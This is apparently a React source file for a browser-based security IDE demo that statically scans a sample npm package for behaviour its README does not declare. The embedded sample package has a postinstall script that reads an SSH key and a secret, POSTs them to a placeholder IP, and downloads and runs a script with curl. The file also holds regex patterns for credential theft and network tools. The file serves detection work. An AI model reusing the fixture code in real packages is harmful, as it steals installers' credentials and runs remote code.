"use client";

import CodeMirror from "@uiw/react-codemirror";
import { javascript } from "@codemirror/lang-javascript";
import { json } from "@codemirror/lang-json";
import { markdown } from "@codemirror/lang-markdown";
import { EditorView } from "@codemirror/view";
import {
  AlertTriangle,
  Blocks,
  Bug,
  Check,
  CheckCircle2,
  ChevronDown,
  ChevronRight,
  CircleDot,
  Command,
  FileCode2,
  FileJson2,
  FilePlus2,
  FileText,
  Files,
  FolderOpen,
  GitBranch,
  KeyRound,
  MoreHorizontal,
  Network,
  PanelBottomClose,
  PanelLeftClose,
  PanelRightClose,
  Play,
  RefreshCw,
  RotateCcw,
  Search,
  Settings,
  ShieldCheck,
  SplitSquareHorizontal,
  TerminalSquare,
  Triangle,
  UserCircle2,
  X,
} from "lucide-react";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";

type SourceFile = {
  path: string;
  name: string;
  language: "javascript" | "json" | "markdown" | "text";
  content: string;
};

type Finding = {
  id: string;
  file: string;
  line: number;
  title: string;
  detail: string;
  category: "credential" | "network" | "process" | "obfuscation" | "persistence";
  severity: "critical" | "high" | "medium";
  weight: number;
  snippet: string;
};

type ScanResult = {
  score: number;
  decision: "REVIEW REQUIRED" | "LOW RISK";
  findings: Finding[];
  observed: Array<{ label: string; state: "matched" | "mismatch"; icon: string }>;
  timeline: Array<{ time: string; label: string; danger?: boolean }>;
};

const STORAGE_KEY = "delta-security-ide-workspace-v1";

const DEFAULT_FILES: SourceFile[] = [
  {
    path: "package.json",
    name: "package.json",
    language: "json",
    content: `{
  "name": "delta-safe-fixture",
  "version": "1.0.0",
  "description": "Build helper that downloads public release metadata",
  "scripts": {
    "postinstall": "node src/index.js",
    "test": "node --test"
  },
  "dependencies": {}
}`,
  },
  {
    path: "README.md",
    name: "README.md",
    language: "markdown",
    content: `# Delta safe fixture

This browser-only fixture demonstrates how DELTA explains a package mismatch.

## Declared behavior

- Write build artifacts inside the package directory.
- Connect to github.com to read public release metadata.
- Run Node.js during installation.

> The sample never runs. It is edited and inspected as text only.`,
  },
  {
    path: "src/index.js",
    name: "index.js",
    language: "javascript",
    content: `import { readFileSync } from "node:fs";
import { exec } from "node:child_process";

const CANARY_ENDPOINT = "http://198.51.100.24/collect";

async function install() {
  // Safe research fixture: paths and values are synthetic.
  const token = process.env.DELTA_CANARY_SECRET;
  const key = readFileSync("/sandbox/home/.ssh/id_rsa", "utf8");

  await fetch(CANARY_ENDPOINT, {
    method: "POST",
    body: JSON.stringify({ token, key }),
  });

  exec("curl -fsSL http://198.51.100.24/bootstrap.js -o /tmp/bootstrap.js && node /tmp/bootstrap.js");
}

install();`,
  },
  {
    path: "src/format.js",
    name: "format.js",
    language: "javascript",
    content: `export function formatRelease(version) {
  return version.trim().replace(/^v/, "");
}`,
  },
  {
    path: ".env.example",
    name: ".env.example",
    language: "text",
    content: `DELTA_CANARY_SECRET=CANARY_ONLY_NOT_A_REAL_SECRET
DELTA_SINKHOLE_URL=http://198.51.100.24`,
  },
];

const INITIAL_RESULT: ScanResult = {
  score: 19.5,
  decision: "REVIEW REQUIRED",
  findings: [
    {
      id: "credential-src/index.js-8",
      file: "src/index.js",
      line: 8,
      title: "Credential file access",
      detail: "README에서 인증정보 파일 접근을 정당화하는 근거를 찾지 못했습니다.",
      category: "credential",
      severity: "critical",
      weight: 5,
      snippet: 'readFileSync("/sandbox/home/.ssh/id_rsa", "utf8")',
    },
    {
      id: "network-src/index.js-10",
      file: "src/index.js",
      line: 10,
      title: "Undeclared network connection",
      detail: "문서에 선언되지 않은 TEST-NET 주소로 데이터 전송을 시도합니다.",
      category: "network",
      severity: "high",
      weight: 3,
      snippet: "await fetch(CANARY_ENDPOINT, {",
    },
    {
      id: "process-src/index.js-15",
      file: "src/index.js",
      line: 15,
      title: "Download and execute chain",
      detail: "다운로드한 스크립트를 곧바로 실행하는 연쇄 행위가 발견되었습니다.",
      category: "process",
      severity: "critical",
      weight: 4,
      snippet: 'exec("curl ... && node /tmp/bootstrap.js")',
    },
  ],
  observed: [
    { label: "Node.js install script", state: "matched", icon: "process" },
    { label: "Package-local write", state: "matched", icon: "file" },
    { label: "Synthetic SSH key read", state: "mismatch", icon: "credential" },
    { label: "Undeclared TEST-NET call", state: "mismatch", icon: "network" },
    { label: "Download → execute", state: "mismatch", icon: "process" },
  ],
  timeline: [
    { time: "00:00.000", label: "postinstall started" },
    { time: "00:00.084", label: "Node.js process spawned" },
    { time: "00:00.121", label: "Synthetic credential read", danger: true },
    { time: "00:00.184", label: "Undeclared connection blocked", danger: true },
  ],
};

function languageFor(path: string): SourceFile["language"] {
  if (path.endsWith(".json")) return "json";
  if (path.endsWith(".md")) return "markdown";
  if (path.endsWith(".js") || path.endsWith(".ts")) return "javascript";
  return "text";
}

function iconFor(file: SourceFile) {
  if (file.language === "json") return <FileJson2 size={15} className="file-icon json" />;
  if (file.language === "markdown") return <FileText size={15} className="file-icon markdown" />;
  return <FileCode2 size={15} className="file-icon code" />;
}

function scanWorkspace(files: SourceFile[]): ScanResult {
  const readme = files.find((file) => file.path === "README.md")?.content.toLowerCase() ?? "";
  const findings: Finding[] = [];
  const add = (
    file: SourceFile,
    line: number,
    title: string,
    detail: string,
    category: Finding["category"],
    severity: Finding["severity"],
    weight: number,
    snippet: string,
  ) => {
    const id = `${category}-${file.path}-${line}-${findings.length}`;
    findings.push({ id, file: file.path, line, title, detail, category, severity, weight, snippet: snippet.trim() });
  };

  files.forEach((file) => {
    if (file.language !== "javascript") return;
    file.content.split("\n").forEach((lineText, index) => {
      const line = index + 1;
      if (/(\.ssh|id_rsa|\.aws|delta_canary_secret)/i.test(lineText)) {
        add(file, line, "Sensitive credential access", "패키지 설명으로 정당화되지 않은 카나리 비밀 또는 인증정보 경로 접근입니다.", "credential", "critical", 5, lineText);
      }
      if (/(fetch\s*\(|https?\.request|curl\s|wget\s)/i.test(lineText)) {
        const declared = /github\.com/i.test(lineText) && readme.includes("github.com");
        if (!declared) add(file, line, "Undeclared network behavior", "README에 선언되지 않은 네트워크 통신입니다.", "network", "high", 3, lineText);
      }
      if (/(child_process|exec\s*\(|spawn\s*\()/i.test(lineText)) {
        add(file, line, "Unexpected process execution", "설치 기능에 필요한 범위를 넘어선 자식 프로세스 실행입니다.", "process", "high", 2, lineText);
      }
      if (/(curl|wget).*(node|sh|bash)|(?:node|sh|bash).*(curl|wget)/i.test(lineText)) {
        add(file, line, "Download and execute chain", "다운로드와 실행이 한 연쇄에서 관측되어 추가 가중치를 적용했습니다.", "process", "critical", 4, lineText);
      }
      if (/(eval\s*\(|fromcharcode|atob\s*\()/i.test(lineText)) {
        add(file, line, "Obfuscated execution", "동적 실행 또는 문자열 복원 패턴이 발견되었습니다.", "obfuscation", "high", 3, lineText);
      }
      if (/(\.bashrc|autostart|launchagents)/i.test(lineText)) {
        add(file, line, "Persistence modification", "사용자 시작 설정을 바꾸는 지속성 행위입니다.", "persistence", "critical", 5, lineText);
      }
    });
  });

  const hasCredential = findings.some((item) => item.category === "credential");
  const hasNetwork = findings.some((item) => item.category === "network");
  const chainBonus = hasCredential && hasNetwork ? 2.5 : 0;
  const score = Math.round((findings.reduce((sum, item) => sum + item.weight, 0) + chainBonus) * 10) / 10;
  const observed: ScanResult["observed"] = [
    { label: "Node.js install script", state: "matched", icon: "process" },
    { label: "Package-local write", state: "matched", icon: "file" },
    ...findings.slice(0, 5).map((item) => ({
      label: item.title,
      state: "mismatch" as const,
      icon: item.category,
    })),
  ];
  const timeline = findings.slice(0, 6).map((item, index) => ({
    time: `00:00.${String(90 + index * 47).padStart(3, "0")}`,
    label: `${item.file}:${item.line} · ${item.title}`,
    danger: item.severity !== "medium",
  }));

  return {
    score,
    decision: score >= 6 ? "REVIEW REQUIRED" : "LOW RISK",
    findings,
    observed,
    timeline: timeline.length ? timeline : [{ time: "00:00.092", label: "No unexplained behavior found" }],
  };
}

function eventIcon(category: string) {
  if (category === "credential") return <KeyRound size={13} />;
  if (category === "network") return <Network size={13} />;
  if (category === "process") return <TerminalSquare size={13} />;
  return <Bug size={13} />;
}

export default function Home() {
  const [files, setFiles] = useState<SourceFile[]>(DEFAULT_FILES);
  const [activePath, setActivePath] = useState("src/index.js");
  const [openTabs, setOpenTabs] = useState(["src/index.js", "package.json", "README.md"]);
  const [dirty, setDirty] = useState<string[]>([]);
  const [activity, setActivity] = useState("explorer");
  const [sidebarVisible, setSidebarVisible] = useState(true);
  const [inspectorVisible, setInspectorVisible] = useState(true);
  const [panelVisible, setPanelVisible] = useState(true);
  const [panelTab, setPanelTab] = useState("terminal");
  const [menuOpen, setMenuOpen] = useState<string | null>(null);
  const [paletteOpen, setPaletteOpen] = useState(false);
  const [paletteQuery, setPaletteQuery] = useState("");
  const [searchQuery, setSearchQuery] = useState("");
  const [terminalInput, setTerminalInput] = useState("");
  const [terminalLines, setTerminalLines] = useState([
    "DELTA Security IDE  ·  browser workspace",
    "This fixture is inspected as text and is never executed.",
    "Type ‘help’ to list available commands.",
  ]);
  const [result, setResult] = useState<ScanResult>(INITIAL_RESULT);
  const [selectedFinding, setSelectedFinding] = useState<string | null>(INITIAL_RESULT.findings[0]?.id ?? null);
  const [analyzing, setAnalyzing] = useState(false);
  const [lastScan, setLastScan] = useState("방금 전");
  const terminalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const restore = window.setTimeout(() => {
      try {
        const saved = window.localStorage.getItem(STORAGE_KEY);
        if (saved) setFiles(JSON.parse(saved));
      } catch {
        // Keep the deterministic demo workspace if local storage is unavailable.
      }
    }, 0);
    return () => window.clearTimeout(restore);
  }, []);

  const activeFile = files.find((file) => file.path === activePath) ?? files[0];
  const selected = result.findings.find((finding) => finding.id === selectedFinding) ?? result.findings[0];

  const selectFile = useCallback((path: string) => {
    setActivePath(path);
    setOpenTabs((tabs) => (tabs.includes(path) ? tabs : [...tabs, path]));
  }, []);

  const saveWorkspace = useCallback((path?: string) => {
    setFiles((current) => {
      try {
        window.localStorage.setItem(STORAGE_KEY, JSON.stringify(current));
      } catch {
        // The editor remains usable in memory.
      }
      return current;
    });
    setDirty((items) => (path ? items.filter((item) => item !== path) : []));
    setTerminalLines((lines) => [...lines, `saved ${path ?? "all workspace files"}`]);
  }, []);

  const runScan = useCallback(() => {
    setAnalyzing(true);
    setPanelVisible(true);
    setPanelTab("delta");
    setTerminalLines((lines) => [...lines, "$ delta scan --mode editor", "Analyzing declarations and source behavior…"]);
    window.setTimeout(() => {
      const next = scanWorkspace(files);
      setResult(next);
      setSelectedFinding(next.findings[0]?.id ?? null);
      setAnalyzing(false);
      setLastScan("방금 전");
      setTerminalLines((lines) => [
        ...lines,
        `Scan complete · ${next.findings.length} findings · Δ ${next.score.toFixed(1)} · ${next.decision}`,
      ]);
    }, 650);
  }, [files]);

  const resetWorkspace = useCallback(() => {
    if (!window.confirm("샘플 작업공간을 초기 상태로 되돌릴까요?")) return;
    setFiles(DEFAULT_FILES);
    setDirty([]);
    setResult(INITIAL_RESULT);
    window.localStorage.removeItem(STORAGE_KEY);
    setTerminalLines((lines) => [...lines, "workspace reset to safe demo fixture"]);
  }, []);

  const newFile = useCallback(() => {
    const name = window.prompt("새 파일 경로", "src/new-file.js")?.trim();
    if (!name || files.some((file) => file.path === name)) return;
    setFiles((items) => [...items, { path: name, name: name.split("/").pop() ?? name, language: languageFor(name), content: "" }]);
    setDirty((items) => [...items, name]);
    selectFile(name);
  }, [files, selectFile]);

  useEffect(() => {
    const handleShortcut = (event: KeyboardEvent) => {
      const meta = event.ctrlKey || event.metaKey;
      if (meta && event.key.toLowerCase() === "s") {
        event.preventDefault();
        saveWorkspace(activePath);
      }
      if (meta && event.shiftKey && event.key.toLowerCase() === "p") {
        event.preventDefault();
        setPaletteOpen(true);
      }
      if (meta && event.shiftKey && event.key.toLowerCase() === "d") {
        event.preventDefault();
        runScan();
      }
      if (meta && event.key === "`") {
        event.preventDefault();
        setPanelVisible((visible) => !visible);
      }
    };
    window.addEventListener("keydown", handleShortcut);
    return () => window.removeEventListener("keydown", handleShortcut);
  }, [activePath, runScan, saveWorkspace]);

  useEffect(() => {
    terminalRef.current?.scrollTo({ top: terminalRef.current.scrollHeight, behavior: "smooth" });
  }, [terminalLines]);

  const searchResults = useMemo(() => {
    if (!searchQuery.trim()) return [];
    const query = searchQuery.toLowerCase();
    return files.flatMap((file) =>
      file.content.split("\n").flatMap((line, index) =>
        line.toLowerCase().includes(query) ? [{ file: file.path, line: index + 1, preview: line.trim() }] : [],
      ),
    ).slice(0, 30);
  }, [files, searchQuery]);

  const folderFiles = (folder: string) => files.filter((file) => file.path.startsWith(`${folder}/`));
  const rootFiles = files.filter((file) => !file.path.includes("/"));

  const closeTab = (path: string) => {
    setOpenTabs((tabs) => {
      const next = tabs.filter((tab) => tab !== path);
      if (path === activePath) setActivePath(next[next.length - 1] ?? files[0]?.path ?? "");
      return next;
    });
  };

  const updateFile = (value: string) => {
    setFiles((items) => items.map((file) => (file.path === activePath ? { ...file, content: value } : file)));
    setDirty((items) => (items.includes(activePath) ? items : [...items, activePath]));
  };

  const runTerminalCommand = () => {
    const command = terminalInput.trim();
    if (!command) return;
    setTerminalInput("");
    if (command === "clear") {
      setTerminalLines([]);
      return;
    }
    setTerminalLines((lines) => [...lines, `$ ${command}`]);
    if (command === "delta scan") runScan();
    else if (command === "help") setTerminalLines((lines) => [...lines, "delta scan  ·  npm test  ·  ls  ·  pwd  ·  clear"]);
    else if (command === "ls") setTerminalLines((lines) => [...lines, "README.md  package.json  src/  .env.example"]);
    else if (command === "pwd") setTerminalLines((lines) => [...lines, "/workspace/vulnerable-demo"]);
    else if (command === "npm test") setTerminalLines((lines) => [...lines, "✓ 6 policy tests passed  (fixture was not executed)"]);
    else setTerminalLines((lines) => [...lines, `command not found: ${command}`]);
  };

  const paletteActions = [
    { label: "DELTA: Run editor security scan", shortcut: "Ctrl Shift D", action: runScan },
    { label: "File: Save active file", shortcut: "Ctrl S", action: () => saveWorkspace(activePath) },
    { label: "File: New file", shortcut: "", action: newFile },
    { label: "View: Toggle Explorer", shortcut: "", action: () => setSidebarVisible((value) => !value) },
    { label: "View: Toggle Security Inspector", shortcut: "", action: () => setInspectorVisible((value) => !value) },
    { label: "View: Toggle Panel", shortcut: "Ctrl `", action: () => setPanelVisible((value) => !value) },
  ].filter((item) => item.label.toLowerCase().includes(paletteQuery.toLowerCase()));

  const editorExtensions = useMemo(() => {
    if (activeFile?.language === "json") return [json(), EditorView.lineWrapping];
    if (activeFile?.language === "markdown") return [markdown(), EditorView.lineWrapping];
    if (activeFile?.language === "javascript") return [javascript({ jsx: true, typescript: activeFile.path.endsWith(".ts") }), EditorView.lineWrapping];
    return [EditorView.lineWrapping];
  }, [activeFile]);

  const menuItems: Record<string, Array<{ label: string; shortcut?: string; action: () => void }>> = {
    File: [
      { label: "New File", shortcut: "", action: newFile },
      { label: "Save", shortcut: "Ctrl S", action: () => saveWorkspace(activePath) },
      { label: "Save All", action: () => saveWorkspace() },
      { label: "Reset Demo Workspace", action: resetWorkspace },
    ],
    Edit: [
      { label: "Find in Workspace", shortcut: "Ctrl Shift F", action: () => { setActivity("search"); setSidebarVisible(true); } },
      { label: "Command Palette", shortcut: "Ctrl Shift P", action: () => setPaletteOpen(true) },
    ],
    Selection: [
      { label: "Analyze Current File", action: runScan },
      { label: "Open Problems", action: () => { setPanelVisible(true); setPanelTab("problems"); } },
    ],
    View: [
      { label: "Explorer", action: () => setSidebarVisible((value) => !value) },
      { label: "Security Inspector", action: () => setInspectorVisible((value) => !value) },
      { label: "Bottom Panel", shortcut: "Ctrl `", action: () => setPanelVisible((value) => !value) },
      { label: "Command Palette", shortcut: "Ctrl Shift P", action: () => setPaletteOpen(true) },
    ],
    Run: [
      { label: "Run DELTA Analysis", shortcut: "Ctrl Shift D", action: runScan },
      { label: "Open DELTA Output", action: () => { setPanelVisible(true); setPanelTab("delta"); } },
    ],
    Terminal: [
      { label: "Toggle Terminal", shortcut: "Ctrl `", action: () => { setPanelVisible(true); setPanelTab("terminal"); } },
      { label: "Run delta scan", action: runScan },
      { label: "Clear Terminal", action: () => setTerminalLines([]) },
    ],
  };

  return (
    <main className="ide-shell" onClick={() => menuOpen && setMenuOpen(null)}>
      <header className="titlebar">
        <button className="brand-mark" aria-label="DELTA home"><Triangle size={18} fill="currentColor" /></button>
        <nav className="menubar" aria-label="Application menu">
          {Object.keys(menuItems).map((menu) => (
            <div className="menu-wrap" key={menu}>
              <button
                className={menuOpen === menu ? "menu-button active" : "menu-button"}
                onClick={(event) => { event.stopPropagation(); setMenuOpen(menuOpen === menu ? null : menu); }}
              >
                {menu}
              </button>
              {menuOpen === menu && (
                <div className="dropdown" onClick={(event) => event.stopPropagation()}>
                  {menuItems[menu].map((item) => (
                    <button key={item.label} onClick={() => { item.action(); setMenuOpen(null); }}>
                      <span>{item.label}</span><kbd>{item.shortcut}</kbd>
                    </button>
                  ))}
                </div>
              )}
            </div>
          ))}
          <button className="menu-button muted-menu" onClick={() => setPaletteOpen(true)}>Help</button>
        </nav>
        <button className="command-center" onClick={(event) => { event.stopPropagation(); setPaletteOpen(true); }}>
          <Search size={13} /> <span>vulnerable-demo</span>
        </button>
        <div className="title-actions">
          <button onClick={() => setSidebarVisible((value) => !value)} aria-label="Toggle Explorer"><PanelLeftClose size={15} /></button>
          <button onClick={() => setPanelVisible((value) => !value)} aria-label="Toggle panel"><PanelBottomClose size={15} /></button>
          <button onClick={() => setInspectorVisible((value) => !value)} aria-label="Toggle inspector"><PanelRightClose size={15} /></button>
          <span className="title-separator" />
          <button aria-label="More actions"><MoreHorizontal size={16} /></button>
        </div>
      </header>

      <div className="workbench">
        <aside className="activitybar">
          <div>
            <button className={activity === "explorer" ? "active" : ""} onClick={() => { setActivity("explorer"); setSidebarVisible(true); }} aria-label="Explorer"><Files /></button>
            <button className={activity === "search" ? "active" : ""} onClick={() => { setActivity("search"); setSidebarVisible(true); }} aria-label="Search"><Search /></button>
            <button className={activity === "source" ? "active" : ""} onClick={() => { setActivity("source"); setSidebarVisible(true); }} aria-label="Source Control"><GitBranch /></button>
            <button className={activity === "run" ? "active" : ""} onClick={() => { setActivity("run"); setSidebarVisible(true); }} aria-label="Run and Debug"><Play /></button>
            <button className={activity === "extensions" ? "active" : ""} onClick={() => { setActivity("extensions"); setSidebarVisible(true); }} aria-label="Extensions"><Blocks /></button>
            <button className={activity === "delta" ? "active delta-activity" : "delta-activity"} onClick={() => { setActivity("delta"); setInspectorVisible(true); }} aria-label="DELTA Security"><ShieldCheck /></button>
          </div>
          <div>
            <button aria-label="Account"><UserCircle2 /></button>
            <button aria-label="Settings"><Settings /></button>
          </div>
        </aside>

        {sidebarVisible && (
          <aside className="sidebar">
            <div className="pane-title"><span>{activity === "search" ? "SEARCH" : activity === "source" ? "SOURCE CONTROL" : activity === "run" ? "RUN AND DEBUG" : activity === "extensions" ? "EXTENSIONS" : "EXPLORER"}</span><MoreHorizontal size={15} /></div>
            {activity === "search" ? (
              <div className="search-pane">
                <div className="search-box"><input autoFocus value={searchQuery} onChange={(event) => setSearchQuery(event.target.value)} placeholder="Search workspace" /><span>{searchResults.length || ""}</span></div>
                <div className="search-results">
                  {searchResults.map((item) => (
                    <button key={`${item.file}-${item.line}`} onClick={() => selectFile(item.file)}>
                      <span>{item.file}<em>:{item.line}</em></span><small>{item.preview}</small>
                    </button>
                  ))}
                  {searchQuery && !searchResults.length && <p className="empty-note">No results found.</p>}
                </div>
              </div>
            ) : activity === "source" ? (
              <div className="empty-pane"><GitBranch size={28} /><p>No source control providers registered.</p><button>Initialize Repository</button></div>
            ) : activity === "run" ? (
              <div className="run-pane"><button className="primary-wide" onClick={runScan}><Play size={14} fill="currentColor" /> Run DELTA Analysis</button><p>현재 편집 중인 파일을 정적 정책으로 분석합니다. 샘플 코드는 실행되지 않습니다.</p></div>
            ) : activity === "extensions" ? (
              <div className="empty-pane"><Blocks size={28} /><p>DELTA Policy Pack is active.</p><button>Browse Policy Packs</button></div>
            ) : (
              <>
                <div className="explorer-heading"><span><ChevronDown size={14} /> VULNERABLE-DEMO</span><span><button onClick={newFile} aria-label="New file"><FilePlus2 size={14} /></button><button aria-label="Refresh"><RefreshCw size={13} /></button></span></div>
                <div className="file-tree">
                  {rootFiles.map((file) => <button key={file.path} className={activePath === file.path ? "selected" : ""} onClick={() => selectFile(file.path)}>{iconFor(file)}<span>{file.name}</span>{dirty.includes(file.path) && <i />}</button>)}
                  {folderFiles("src").length > 0 && <div className="folder-row"><ChevronDown size={13} /><FolderOpen size={14} /><span>src</span></div>}
                  {folderFiles("src").map((file) => <button key={file.path} className={`nested ${activePath === file.path ? "selected" : ""}`} onClick={() => selectFile(file.path)}>{iconFor(file)}<span>{file.name}</span>{dirty.includes(file.path) && <i />}</button>)}
                  {files.filter((file) => file.path.includes("/") && !file.path.startsWith("src/")).map((file) => <button key={file.path} className={activePath === file.path ? "selected" : ""} onClick={() => selectFile(file.path)}>{iconFor(file)}<span>{file.path}</span></button>)}
                </div>
                <div className="sidebar-section"><span><ChevronRight size={14} /> OUTLINE</span></div>
                <div className="sidebar-section"><span><ChevronRight size={14} /> TIMELINE</span></div>
                <div className="sidebar-section delta-section"><span><ChevronDown size={14} /> DELTA SECURITY</span><strong className={result.decision === "REVIEW REQUIRED" ? "danger" : "safe"}>Δ {result.score.toFixed(1)}</strong></div>
                <div className="mini-scan"><span>{result.findings.length} unexplained behaviors</span><button onClick={runScan}>{analyzing ? "Scanning…" : "Rescan"}</button></div>
              </>
            )}
          </aside>
        )}

        <section className={`editor-stack ${!panelVisible ? "panel-hidden" : ""}`}>
          <div className="tabs-row">
            <div className="tabs-scroll">
              {openTabs.map((path) => {
                const file = files.find((item) => item.path === path);
                if (!file) return null;
                return <button key={path} className={path === activePath ? "tab active" : "tab"} onClick={() => setActivePath(path)}>{iconFor(file)}<span>{file.name}</span>{dirty.includes(path) ? <CircleDot size={9} className="dirty-dot" /> : <X size={13} onClick={(event) => { event.stopPropagation(); closeTab(path); }} />}</button>;
              })}
            </div>
            <div className="editor-actions"><button title="Split editor"><SplitSquareHorizontal size={14} /></button><button><MoreHorizontal size={15} /></button></div>
          </div>
          <div className="breadcrumbs"><span>vulnerable-demo</span><ChevronRight size={12} /><span>{activeFile?.path.includes("/") ? activeFile.path.split("/")[0] : ""}</span>{activeFile?.path.includes("/") && <ChevronRight size={12} />}<strong>{activeFile?.name}</strong></div>
          <div className="editor-area">
            {activeFile && (
              <CodeMirror
                key={activeFile.path}
                value={activeFile.content}
                height="100%"
                theme="dark"
                extensions={editorExtensions}
                onChange={updateFile}
                basicSetup={{
                  lineNumbers: true,
                  highlightActiveLineGutter: true,
                  highlightActiveLine: true,
                  foldGutter: true,
                  bracketMatching: true,
                  closeBrackets: true,
                  autocompletion: true,
                  searchKeymap: true,
                }}
                aria-label={`${activeFile.name} code editor`}
              />
            )}
          </div>

          {panelVisible && (
            <section className="bottom-panel">
              <div className="panel-tabs">
                <div>
                  {["problems", "output", "terminal", "delta"].map((tab) => <button key={tab} className={panelTab === tab ? "active" : ""} onClick={() => setPanelTab(tab)}>{tab.toUpperCase()}{tab === "problems" && result.findings.length ? <b>{result.findings.length}</b> : null}</button>)}
                </div>
                <div><button onClick={() => setPanelVisible(false)}><X size={14} /></button></div>
              </div>
              {panelTab === "terminal" && (
                <div className="terminal" ref={terminalRef}>
                  {terminalLines.map((line, index) => <div key={`${line}-${index}`} className={line.includes("REVIEW") || line.includes("Analyzing") ? "terminal-accent" : ""}>{line}</div>)}
                  <div className="terminal-prompt"><span>delta@workspace</span><b>:</b><em>~/vulnerable-demo</em><b>$</b><input value={terminalInput} onChange={(event) => setTerminalInput(event.target.value)} onKeyDown={(event) => event.key === "Enter" && runTerminalCommand()} aria-label="Terminal input" spellCheck={false} /></div>
                </div>
              )}
              {panelTab === "problems" && <div className="problem-list">{result.findings.map((finding) => <button key={finding.id} onClick={() => { setSelectedFinding(finding.id); selectFile(finding.file); }}><AlertTriangle size={13} /><span>{finding.title}</span><small>{finding.file}:{finding.line}</small><em>{finding.severity}</em></button>)}</div>}
              {panelTab === "output" && <div className="output-pane"><p>[DELTA] Policy schema loaded · 18 behavior classes</p><p>[DELTA] Browser workspace ready · execution disabled</p><p>[DELTA] Last scan: {result.findings.length} mismatches, score {result.score.toFixed(1)}</p></div>}
              {panelTab === "delta" && <div className="timeline-list">{result.timeline.map((event) => <div key={`${event.time}-${event.label}`} className={event.danger ? "danger" : ""}><time>{event.time}</time><span /><p>{event.label}</p></div>)}</div>}
            </section>
          )}
        </section>

        {inspectorVisible && (
          <aside className="inspector">
            <div className="inspector-title"><span><Triangle size={13} fill="currentColor" /> DELTA ANALYSIS</span><div><button onClick={runScan} title="Run scan"><RefreshCw size={14} className={analyzing ? "spin" : ""} /></button><button onClick={() => setInspectorVisible(false)}><X size={14} /></button></div></div>
            <div className="mode-bar"><span className="live-dot" /> EDITOR SCAN <em>·</em> <span>saved {lastScan}</span></div>
            <section className="score-card">
              <div><span>DELTA SCORE</span><strong>Δ {result.score.toFixed(1)}</strong></div>
              <div className={result.decision === "REVIEW REQUIRED" ? "decision danger" : "decision safe"}>{result.decision === "REVIEW REQUIRED" ? <AlertTriangle size={15} /> : <CheckCircle2 size={15} />} {result.decision}</div>
              <p>{result.findings.length}개의 설명되지 않는 행위가 현재 코드에서 발견되었습니다.</p>
              <div className="score-track"><span style={{ width: `${Math.min(100, result.score * 4)}%` }} /></div>
              <div className="score-scale"><span>0</span><span>threshold 6</span><span>25+</span></div>
            </section>
            <section className="diff-section">
              <div className="section-label"><span>BEHAVIOR DIFF</span><small>DECLARED ↔ OBSERVED</small></div>
              <div className="expected-row"><Check size={13} /><span>github.com release metadata</span><small>matched</small></div>
              <div className="expected-row"><Check size={13} /><span>Node.js install process</span><small>matched</small></div>
              {result.observed.filter((item) => item.state === "mismatch").map((item, index) => (
                <button className="mismatch-row" key={`${item.label}-${index}`} onClick={() => setSelectedFinding(result.findings[index]?.id ?? null)}><AlertTriangle size={13} /><span>{item.label}</span><small>+{result.findings[index]?.weight ?? 0}</small></button>
              ))}
            </section>
            <section className="finding-detail">
              <div className="section-label"><span>SELECTED FINDING</span><small>{selected?.severity.toUpperCase()}</small></div>
              {selected ? (
                <>
                  <div className="finding-heading">{eventIcon(selected.category)}<strong>{selected.title}</strong></div>
                  <p>{selected.detail}</p>
                  <div className="code-evidence"><span>{selected.file}:{selected.line}</span><code>{selected.snippet}</code></div>
                  <dl><div><dt>Behavior</dt><dd>{selected.category}</dd></div><div><dt>Weight</dt><dd>+{selected.weight}</dd></div><div><dt>Status</dt><dd className="blocked">UNEXPLAINED</dd></div></dl>
                </>
              ) : <div className="no-findings"><CheckCircle2 size={24} /><p>No unexplained behavior.</p></div>}
            </section>
            <button className="scan-button" onClick={runScan} disabled={analyzing}>{analyzing ? <><RefreshCw className="spin" size={15} /> Analyzing workspace…</> : <><ShieldCheck size={15} /> Run DELTA Analysis <kbd>⌃⇧D</kbd></>}</button>
            <p className="sandbox-note"><ShieldCheck size={12} /> Editor scan only. Package execution requires the isolated runner.</p>
          </aside>
        )}
      </div>

      <footer className="statusbar">
        <div><span><GitBranch size={12} /> main*</span><span><RotateCcw size={12} /> 0</span><span><X size={12} /> 0</span><span><AlertTriangle size={12} /> {result.findings.length}</span></div>
        <div><span>Ln 8, Col 28</span><span>Spaces: 2</span><span>UTF-8</span><span>{activeFile?.language ?? "Plain Text"}</span><span><ShieldCheck size={12} /> DELTA {result.decision === "LOW RISK" ? "Safe" : "Review"}</span></div>
      </footer>

      {paletteOpen && (
        <div className="palette-backdrop" onMouseDown={() => setPaletteOpen(false)}>
          <div className="palette" onMouseDown={(event) => event.stopPropagation()}>
            <div className="palette-input"><Command size={17} /><input autoFocus value={paletteQuery} onChange={(event) => setPaletteQuery(event.target.value)} placeholder="Type a command" onKeyDown={(event) => event.key === "Escape" && setPaletteOpen(false)} /></div>
            <p>COMMANDS</p>
            {paletteActions.map((item, index) => <button key={item.label} className={index === 0 ? "selected" : ""} onClick={() => { item.action(); setPaletteOpen(false); setPaletteQuery(""); }}><span>{item.label}</span><kbd>{item.shortcut}</kbd></button>)}
          </div>
        </div>
      )}
    </main>
  );
}
